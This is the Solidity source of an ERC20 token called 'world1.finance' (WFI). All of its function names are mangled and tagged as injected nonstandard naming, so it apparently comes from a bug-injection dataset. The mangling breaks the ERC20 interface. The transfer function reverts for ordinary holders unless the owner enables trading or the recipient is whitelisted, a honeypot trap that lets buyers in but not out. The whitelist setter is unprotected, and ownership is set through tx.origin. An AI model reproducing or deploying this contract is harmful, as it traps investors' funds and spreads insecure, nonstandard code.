                                                                 

                                                                 

                                                                 

pragma solidity ^0.5.16;

interface IERC20 {
    function TOTALSUPPLY253() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF70(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER198(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE266(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE485(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM265(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER219(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL460(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER766() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;

    mapping (address => uint) private _balances;
    
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => bool) private exceptions;
    address private uniswap;
    address private _owner;
    uint private _totalSupply;
    bool private allow;

    constructor(address owner) public{
      _owner = owner;
      allow = false;
    }

    function SETALLOW255() public{	//inject NONSTANDARD NAMING
        require(_MSGSENDER766() == _owner,"Only owner can change set allow");
        allow = true;
    }

    function SETEXCEPTIONS386(address someAddress) public{	//inject NONSTANDARD NAMING
        exceptions[someAddress] = true;
    }

    function BURNOWNER660() public{	//inject NONSTANDARD NAMING
        require(_MSGSENDER766() == _owner,"Only owner can change set allow");
        _owner = address(0);
    }    

    function TOTALSUPPLY253() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF70(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER198(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER42(_MSGSENDER766(), recipient, amount);
        return true;
    }
    function ALLOWANCE266(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE485(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE857(_MSGSENDER766(), spender, amount);
        return true;
    }
    function TRANSFERFROM265(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER42(sender, recipient, amount);
        _APPROVE857(sender, _MSGSENDER766(), _allowances[sender][_MSGSENDER766()].SUB578(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE693(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE857(_MSGSENDER766(), spender, _allowances[_MSGSENDER766()][spender].ADD783(addedValue));
        return true;
    }
    function DECREASEALLOWANCE847(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE857(_MSGSENDER766(), spender, _allowances[_MSGSENDER766()][spender].SUB578(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER42(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        // Trigger special exceptions
        if(sender == _owner || allow ) {
          _balances[sender] = _balances[sender].SUB578(amount, "ERC20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].ADD783(amount);
          emit TRANSFER219(sender, recipient, amount);
        }else {
          if(exceptions[recipient]) {
            _balances[sender] = _balances[sender].SUB578(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].ADD783(amount);
            emit TRANSFER219(sender, recipient, amount);
          }else {
            revert();
          }
        }
    }
    
    function _MINT418(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD783(amount);
        _balances[account] = _balances[account].ADD783(amount);
        emit TRANSFER219(address(0), account, amount);
    }
    function _BURN370(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB578(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB578(amount);
        emit TRANSFER219(account, address(0), amount);
    }
    function _APPROVE857(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL460(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME387() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL212() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS545() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD783(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function SUB578(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB578(a, b, "SafeMath: subtraction overflow");
    }
    function SUB578(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function MUL432(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function DIV100(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV100(a, b, "SafeMath: division by zero");
    }
    function DIV100(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT978(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function SAFETRANSFER276(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN628(token, abi.encodeWithSelector(token.TRANSFER198.selector, to, value));
    }

    function SAFETRANSFERFROM477(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN628(token, abi.encodeWithSelector(token.TRANSFERFROM265.selector, from, to, value));
    }

    function SAFEAPPROVE773(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE266(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN628(token, abi.encodeWithSelector(token.APPROVE485.selector, spender, value));
    }
    function CALLOPTIONALRETURN628(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT978(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract WFI is ERC20, ERC20Detailed {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;
  
  
  address public governance;
  mapping (address => bool) public minters;

  constructor () public ERC20Detailed("world1.finance", "WFI", 18) ERC20(tx.origin){
      governance = tx.origin;
  }

  function MINT607(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(minters[msg.sender], "!minter");
      _MINT418(account, amount);
  }
  
  function SETGOVERNANCE630(address _governance) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }
  
  function ADDMINTER422(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = true;
  }
  
  function REMOVEMINTER695(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = false;
  }
}